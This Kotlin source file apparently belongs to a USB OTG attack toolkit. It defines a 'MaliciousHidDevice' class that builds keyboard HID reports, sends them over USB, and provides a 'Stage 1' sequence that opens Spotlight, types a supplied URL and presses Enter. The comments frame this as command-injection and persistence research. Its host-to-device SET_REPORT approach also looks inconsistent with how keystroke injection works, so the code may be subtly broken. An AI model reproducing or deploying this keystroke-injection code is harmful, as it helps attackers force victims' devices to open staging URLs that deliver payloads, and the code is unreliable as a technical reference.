package com.deepeye.otg.fuzz.hid

import com.deepeye.otg.usb.UsbTransport
import timber.log.Timber
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Malicious HID Device (Stage 11.extra)
 * Converts HID fuzzer findings into stable payloads for command injection
 * and initial persistence research.
 */
@Singleton
class MaliciousHidDevice @Inject constructor() {

    /**
     * Sends a sequence of HID keycodes to the target device.
     * Encapsulates 'keyboard' injection for research.
     */
    suspend fun injectKeystrokes(transport: UsbTransport, sequences: List<HidKeystroke>): Result<Boolean> {
        Timber.i("[HID] Injecting ${sequences.size} malicious keystrokes")
        
        for (stroke in sequences) {
            // Standard HID Keyboard Report: [Modifier, Reserved, Key1, Key2, Key3, Key4, Key5, Key6]
            val report = ByteArray(8)
            report[0] = stroke.modifier
            report[2] = stroke.keycode
            
            // Send Key Down
            val downResult = transport.controlTransfer(
                requestType = 0x21, // Class | Interface | Host-to-Device
                request = 0x09,      // SET_REPORT
                value = 0x0200,      // Output Report
                index = stroke.interfaceIndex,
                buffer = report,
                length = report.size,
                timeout = 1000
            )
            
            if (downResult.isFailure) return Result.failure(Exception("HID Down failed"))

            // Send Key Up (Empty Report)
            val upResult = transport.controlTransfer(
                requestType = 0x21,
                request = 0x09,
                value = 0x0200,
                index = stroke.interfaceIndex,
                buffer = ByteArray(8),
                length = 8,
                timeout = 1000
            )
            
            if (upResult.isFailure) return Result.failure(Exception("HID Up failed"))
            
            kotlinx.coroutines.delay(stroke.delayMs)
        }
        
        return Result.success(true)
    }

    /**
     * Pre-defined sequence to open Safari and navigate to a Stage 1 URL.
     * Uses real HID mapping for tactical reliability.
     */
    fun getStage1TriggerSequence(url: String): List<HidKeystroke> {
        val list = mutableListOf<HidKeystroke>()
        // 1. Command + Space (Spotlight) - 0x08 is Left GUI
        list.add(HidKeystroke(modifier = 0x08, keycode = 0x2C, delayMs = 600)) 
        
        // 2. Type "Safari" (Optional if URL handled by spotlight)
        // 3. Type URL
        list.addAll(typeString(url))
        
        // 4. Enter
        list.add(HidKeystroke(modifier = 0, keycode = 0x28, delayMs = 200))
        return list
    }

    private fun typeString(text: String): List<HidKeystroke> {
        return text.mapNotNull { char ->
            val mapped = charToHid(char)
            if (mapped != null) {
                HidKeystroke(modifier = mapped.first, keycode = mapped.second, delayMs = 30)
            } else null
        }
    }

    /**
     * Maps standard ASCII characters to USB HID Keyboard Scancodes.
     * @return Pair<Modifier, Keycode>
     */
    private fun charToHid(c: Char): Pair<Byte, Byte>? {
        return when (c) {
            in 'a'..'z' -> Pair(0, (0x04 + (c - 'a')).toByte())
            in 'A'..'Z' -> Pair(0x02, (0x04 + (c - 'A')).toByte()) // Shift
            in '1'..'9' -> Pair(0, (0x1E + (c - '1')).toByte())
            '0' -> Pair(0, 0x27)
            ' ' -> Pair(0, 0x2C)
            '.' -> Pair(0, 0x37)
            '/' -> Pair(0, 0x38)
            ':' -> Pair(0x02, 0x33) // Shift + ;
            '-' -> Pair(0, 0x2D)
            '_' -> Pair(0x02, 0x2D) // Shift + -
            else -> null
        }
    }

    data class HidKeystroke(
        val modifier: Byte,
        val keycode: Byte,
        val interfaceIndex: Int = 0,
        val delayMs: Long = 100
    )
}
